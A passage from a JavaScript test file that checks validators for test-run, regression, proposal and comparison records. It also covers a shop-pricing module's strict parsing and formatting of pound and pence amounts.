  assert.equal(validateBaseline(baselineBody({
    execution: executionRecord({ exitCode: "0" }),
  })).ok, false, "exit codes are integers or null, never strings");
  assert.equal(validateBaseline(baselineBody({
    execution: executionRecord({ counts: { tests: 6, passed: 6, failed: 0, skipped: 0 } }),
  })).ok, false, "counts must carry every field including cancelled");
  assert.equal(validateBaseline(baselineBody({
    status: "FAIL",
    execution: executionRecord({ exitCode: 1, counts: null }),
  })).ok, true, "a FAIL with null counts is honest and allowed");
  assert.equal(validateBaseline(baselineBody({
    execution: executionRecord({ counts: { tests: 5, passed: 5, failed: 0, skipped: 0, cancelled: 0 } }),
  })).ok, false, "PASS requires the declared six assertions");

  assert.equal(validateRegression(regressionBody()).ok, true);
  assert.equal(validateRegression(regressionBody({ origin: "FIXTURE" })).ok, false);
  assert.equal(validateRegression(regressionBody({ status: "GREEN" })).ok, false);
  assert.equal(validateRegression(regressionBody({ testSha256: "XYZ" })).ok, false);
  assert.equal(validateRegression(regressionBody({ sameTest: "true" })).ok, false);
  assert.equal(validateRegression(regressionBody({ sameTest: false })).ok, false,
    "RED_THEN_GREEN requires sameTest true");
  assert.equal(validateRegression(regressionBody({ green: null })).ok, false,
    "RED_THEN_GREEN requires a green run record");
  assert.equal(validateRegression(regressionBody({
    status: "INCONCLUSIVE", green: null,
  })).ok, true, "INCONCLUSIVE may honestly omit the green run");
  assert.equal(validateRegression(regressionBody({
    correction: {
      kind: "MUSE_GENERATED", label: "x", faultySha256: HEX_D, correctedSha256: HEX_E,
    },
  })).ok, false, "only the pre-reviewed fixed correction kind is accepted");
  assert.equal(validateRegression(regressionBody({ cleanup: {} })).ok, false);

  assert.equal(validateProposal(proposalBody()).ok, true);
  const base = proposalBody().cases[0];
  const caseWith = (mutate) => {
    const body = proposalBody();
    body.cases = [structuredClone(base)];
    mutate(body.cases[0]);
    return body;
  };
  const fourCases = proposalBody();
  fourCases.cases = [1, 2, 3, 4].map((n) => ({
    ...structuredClone(base),
    id: `case-${n}`,
  }));
  assert.equal(validateProposal(fourCases).ok, false, "at most three cases");
  assert.equal(validateProposal(caseWith((entry) => {
    entry.lines = Array.from({ length: 5 }, () => ({ amount: 1000, discountEligible: true }));
  })).ok, false, "at most four lines");
  assert.equal(validateProposal(caseWith((entry) => { entry.lines[0].amount = 150; })).ok, false,
    "amounts must be multiples of 100");
  assert.equal(validateProposal(caseWith((entry) => { entry.lines[0].amount = 0; })).ok, false,
    "amounts start at 100");
  assert.equal(validateProposal(caseWith((entry) => { entry.lines[0].discountEligible = "yes"; })).ok, false,
    "eligibility must be an explicit boolean");
  assert.equal(validateProposal(caseWith((entry) => { entry.expectedTotal = "900"; })).ok, false,
    "expected totals are integers, not numeric strings");
  assert.equal(validateProposal(caseWith((entry) => { entry.rationale = ""; })).ok, false);

  const extraField = acceptedBody();
  extraField.acceptedCases[0].observedTotal = 900;
  assert.equal(validateAccepted(extraField).ok, false,
    "acceptance must not carry observed outcomes");
  assert.equal(validateAccepted(acceptedBody()).ok, true);

  assert.equal(validateComparison(comparisonBody()).ok, true);
  assert.equal(validateComparison(comparisonBody({ status: "REPRODUCED" })).ok, true);
  assert.equal(validateComparison(comparisonBody({ status: "NO_COUNTEREXAMPLE" })).ok, true);
  const bothNull = comparisonBody();
  bothNull.rows[0].original = { value: null, error: null };
  assert.equal(validateComparison(bothNull).ok, false, "an outcome needs a value or an error");
  const bothSet = comparisonBody();
  bothSet.rows[0].candidate = { value: 900, error: "also an error" };
  assert.equal(validateComparison(bothSet).ok, false, "an outcome cannot be both");
});

test("observed charge impact is derived from candidate minus reviewed expectation", () => {
  assert.equal(describeChargeDifference(1100, 1000), "Customer overcharged £1.00");
  assert.equal(describeChargeDifference(900, 1000), "Shop undercharges £1.00");
  assert.equal(describeChargeDifference(1000, 1000), "Matches the reviewed total.");
  assert.equal(describeChargeDifference(null, 1000), "Charge comparison unavailable.");
});

test("pound input parsing and pence formatting are strict and symmetric", () => {
  assert.equal(parsePoundsInput("90"), 9000);
  assert.equal(parsePoundsInput(" 90.00 "), 9000);
  assert.equal(parsePoundsInput("£90.00"), 9000);
  assert.equal(parsePoundsInput("90.5"), 9050);
  assert.equal(parsePoundsInput("28.50"), 2850);
  assert.equal(parsePoundsInput("4000.00"), 400000);
  assert.equal(parsePoundsInput(""), null);
  assert.equal(parsePoundsInput("90.505"), null, "no more than two decimal places");
  assert.equal(parsePoundsInput("-90"), null);
  assert.equal(parsePoundsInput("1e3"), null);
  assert.equal(parsePoundsInput("4000.01"), null, "above the domain maximum");
  assert.equal(parsePoundsInput("90,00"), null);
  assert.equal(parsePoundsInput(90), null, "non-string input is rejected, not coerced");

  assert.equal(penceToPoundsString(9000), "90.00");
  assert.equal(penceToPoundsString(2850), "28.50");
  assert.equal(formatPence(9000), "£90.00");
  assert.equal(formatPence(2850), "£28.50");

  assert.equal(isValidExpectedTotal(900), true);
  assert.equal(isValidExpectedTotal(900.5), false);
  assert.equal(isValidExpectedTotal("900"), false);
  assert.equal(isValidExpectedTotal(-1), false);
});
